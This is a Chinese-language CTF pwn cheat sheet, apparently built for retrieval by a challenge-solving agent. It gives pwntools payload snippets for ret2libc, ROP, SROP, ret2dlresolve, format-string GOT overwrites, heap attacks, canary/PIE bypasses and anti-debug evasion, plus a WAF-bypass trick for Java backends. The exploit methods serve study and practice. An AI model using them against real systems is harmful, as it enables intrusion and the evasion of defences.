# 二进制进阶漏洞利用手册

适用题型（命中即召回本手册）：栈溢出 缓冲区溢出 ROP ret2libc canary PIE NX RELRO 格式化字符串 format-string %n 堆 heap tcache fastbin UAF use-after-free double-free shellcode one_gadget angr 符号执行 反调试 ptrace Z3

## 1. 识别与分类
- checksec 四值定打法：NX=栈不可执行→弃 shellcode 改 ROP/ret2libc；Canary=溢出前须先泄密或爆破；PIE=代码基址随机→须先泄基址或部分覆盖；RELRO Full=GOT 只读→改写 hook/_IO_FILE/exit_funcs。
- 现象判据：崩溃地址 0x41414141=可控返回地址；输入 %p 回显十六进制=格式化字符串；崩溃落在 free/malloc 内=堆漏洞；一挂 gdb 就退出或行为异常=反调试。
- 偏移定位：`from pwn import *; cyclic(200)` 送入，崩溃取 RIP 值，`cyclic_find(v)` 得偏移；gdb 用 `pattern create 200` + `pattern offset $rsp`。

## 2. 攻击方法论
1. ret2win（无 PIE 直跳后门）：`payload=b'A'*off+p64(elf.sym['win'])`；win 通常直接打印目标串或开 shell。
2. ret2libc 二段式泄密：`pop_rdi=ROP(elf).find_gadget(['pop rdi','ret'])[0]`；一段 `b'A'*off+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main)`，收 `leak=u64(r(6).ljust(8,b'\0'))`，`libc.address=leak-libc.sym['puts']`；二段 `p64(ret)+p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system'])`。
3. ROP 链构造：`ROPgadget --binary pwn --only "pop|ret"` 找 `pop rdi;ret`/`pop rsi;pop r15;ret`/`syscall;ret`；64 位调 system 前插一个裸 `ret` 对齐 movaps；缺 pop rdx 用 ret2csu（__libc_csu_init 两段 gadget）。
4. ret2dlresolve（无 libc 泄密）：`dl=Ret2dlresolvePayload(elf,symbol='system',args=['/bin/sh']); rop.read(0,dl.data_addr); rop.ret2dlresolve(dl)`；伪造 Elf_Sym/Elf_Rela 让动态链接器解析 system。
5. SROP（缺 gadget）：`frame=SigreturnFrame(); frame.rax=59; frame.rdi=binsh; frame.rip=syscall_ret; payload=b'A'*off+p64(pop_rax)+p64(15)+p64(syscall_ret)+bytes(frame)`。
6. 格式化字符串：偏移 `for i in range(1,30): send(b'AAAA%'+str(i).encode()+b'$p')` 找 0x41414141；泄密用 `%N$p`/`%N$s`（%N$s 把第 N 个参数当指针读）；任意写 `fmtstr_payload(off,{elf.got['printf']:libc.sym['system']})` 后 printf 传入 /bin/sh。64 位地址含 \x00，须放格式串之后按 8 字节对齐。
7. 堆利用入门：tcache poisoning 覆写 free chunk 的 fd 到目标→连续 malloc 两次落到目标写；fastbin dup 用 double free 制造重复分配；UAF 释放后读写 fd/bk 泄密或覆写；unsortedbin 泄 libc 基址（fd/bk 指向 main_arena）；glibc≥2.32 safe-linking 解码 `real=stored^(chunk>>12)`。
8. angr 解复杂约束：`proj=angr.Project(f,auto_load_libs=False); st=proj.factory.entry_state(stdin=claripy.BVS('in',8*32)); sm=proj.factory.simulation_manager(st); sm.explore(find=lambda s:b'Correct' in s.posix.dumps(1), avoid=lambda s:b'Wrong' in s.posix.dumps(1)); sm.found[0].solver.eval(sym,cast_to=bytes)`；纯方程题直接 Z3 `Solver().add(...); s.check(); s.model()`。
9. 栈迁移（溢出长度不足）：控制 rbp 指向可控缓冲，`leave; ret`（mov rsp,rbp; pop rbp; ret）两段式把 rsp 迁到 fake stack 再走 ROP。
10. 反调试对抗：ptrace(TRACEME) 用 `echo 'long ptrace(int a,...){return 0;}' >/tmp/a.c; gcc -shared -o /tmp/a.so /tmp/a.c; LD_PRELOAD=/tmp/a.so ./pwn`；gdb `catch syscall ptrace` 后改 rax=0；rdtsc 时序检查用条件断点改比较结果；TracerPid 用 LD_PRELOAD 过滤 fopen/fread。

## 3. 变体与绕过
- Canary：fork 服务逐字节爆破（每字节 256 次、首字节固定 0 共 7 字节）；有泄密直接 %p 读；溢出覆盖 TLS 的 fs:[0x28]；部分覆盖 canary 尾字节再借输出重读。
- PIE：泄露返回地址 `base=leak-off`；部分覆盖低 12 位（1/16 命中）；无泄密改 ret2dlresolve。
- RELRO Full：改写 __malloc_hook/__free_hook（glibc<2.34，配合 one_gadget 或 system）；≥2.34 打 _IO_FILE vtable/FSOP、exit_funcs、TLS_dtor_list。
- 堆版本绕过：glibc 2.29 tcache key（chunk+0x18）先覆写再 double free；House of Botcake 用 unsortedbin+tcache 重叠；off-by-null 清 PREV_INUSE 触发向后合并（House of Einherjar）。
- 32 位 ret2libc 无 gadget：参数压栈 `p32(system)+p32(exit)+p32(binsh)`；64 位改 RDI/RSI/RDX 寄存器传参。
- 静态链接无 libc：直接用二进制内 syscall/execve 构造 SROP，或找 syscall;ret 链 execve('/bin/sh')。
- FORTIFY_SOURCE 禁位置参数 %N$n→改用连续 %hn/%hhn 顺序写；NX 关→ret2shellcode + nop sled。
- one_gadget 受 rsp/rcx 约束（如 rsp&0xf==0、[rsp+0x40]==NULL），不满足用前置 ret 链调整寄存器。
- Ghost Bits 奇技（Java 后端 + 前置 WAF 时）：16bit char 静默窄化为 8bit byte，`chr((k<<8)|T)`（k=1..255，避开代理区 0xD8..0xDF）生成 WAF 视为无害的 Unicode，后端还原为攻击 ASCII 字节；源码触发点 grep `(byte)`/`&0xFF`/`writeBytes`/`fromHexDigit`/`charToHex`。

## 战法要点
- checksec 四值决定路线：NX→ROP，Canary→先泄密，PIE→先泄基址，RELRO→定改写目标。
- 泄密优先于爆破：能 printf/puts 泄密就不逐字节爆破 canary/基址。
- 64 位 system/one_gadget 崩溃首查栈对齐（缺一个 ret）。
- 无 libc 泄密时优先 ret2dlresolve，其次 SROP/静态链接 syscall 链。
- 32 位按参数压栈、64 位按寄存器传参，别混用 ABI。
- glibc 版本决定堆打法：<2.26 无 tcache、2.29 加 key、2.32 safe-linking、2.34 删 hook。
- one_gadget 失败就回退 ret2libc 标准链，别死磕约束。
- angr 卡死=路径爆炸：加 avoid、hook scanf/strcmp、开 Veritesting。

## 速查清单
```text
checksec ./pwn                          # 四防护一览
cyclic 200 ; cyclic_find v              # 偏移定位
ROPgadget --binary pwn --only "pop|ret"
ROPgadget --binary pwn --ropchain       # 自动生成链
ropper -f pwn --search "pop rdx"
one_gadget ./libc.so.6                  # 一把梭 gadget
fmtstr_payload(off,{got:target})        # 格式化串写 GOT
u64(r(6).ljust(8,b'\0'))                # 收 64 位地址
real=stored^(chunk>>12)                 # safe-linking 解码
Ret2dlresolvePayload(elf,symbol='system',args=['/bin/sh'])
SigreturnFrame(); ROP(elf).call('system',['/bin/sh'])
context.arch='amd64'; shellcraft.sh()   # ret2shellcode
pwndbg: vmmap / got / heap / bins / telescope $rsp 20
pwn template ./pwn --host x --port y   # 生成 exploit 骨架
ROP(elf).call('system',['/bin/sh'])    # pwntools 自动链
```
